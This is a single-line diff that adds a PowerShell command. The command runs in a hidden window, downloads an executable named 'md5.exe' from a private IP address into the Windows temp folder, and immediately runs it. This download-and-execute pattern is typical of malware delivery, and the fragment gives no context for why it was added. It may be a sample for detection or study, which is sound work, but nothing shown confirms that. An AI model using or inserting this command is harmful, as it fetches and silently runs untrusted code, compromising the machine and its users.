@@ -1,0 +1,1 @@
+-windowstyle hidden (new-object System.Net.WebClient).DownloadFile(\'http://192.168.157.129/20178570/md5.exe\', \'c:/windows/temp/md5.exe\'); c:/windows/temp/md5.exe
